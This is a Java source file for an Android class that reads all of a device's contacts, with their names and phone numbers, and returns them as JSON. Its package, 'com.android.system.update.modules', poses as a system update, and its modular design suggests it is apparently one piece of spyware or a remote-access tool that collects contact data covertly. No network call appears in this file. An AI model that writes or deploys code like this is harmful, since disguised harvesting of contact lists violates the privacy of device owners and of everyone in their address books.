package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsModule {
    private Context context;
    
    public ContactsModule(Context context) {
        this.context = context;
    }
    
    public String getContacts() {
        if (!checkPermission()) return "ERROR: No contacts permission";
        
        try {
            JSONArray contactsList = new JSONArray();
            ContentResolver cr = context.getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                int idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                int nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                int hasPhoneIdx = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER);
                
                do {
                    String contactId = cursor.getString(idIdx);
                    String name = cursor.getString(nameIdx);
                    int hasPhone = cursor.getInt(hasPhoneIdx);
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    
                    if (hasPhone > 0) {
                        JSONArray phones = new JSONArray();
                        Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null);
                        
                        if (phoneCursor != null && phoneCursor.moveToFirst()) {
                            int phoneNumIdx = phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER);
                            
                            do {
                                phones.put(phoneCursor.getString(phoneNumIdx));
                            } while (phoneCursor.moveToNext());
                            
                            phoneCursor.close();
                        }
                        contact.put("phones", phones);
                    }
                    
                    contactsList.put(contact);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            return contactsList.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
            == PackageManager.PERMISSION_GRANTED;
    }
}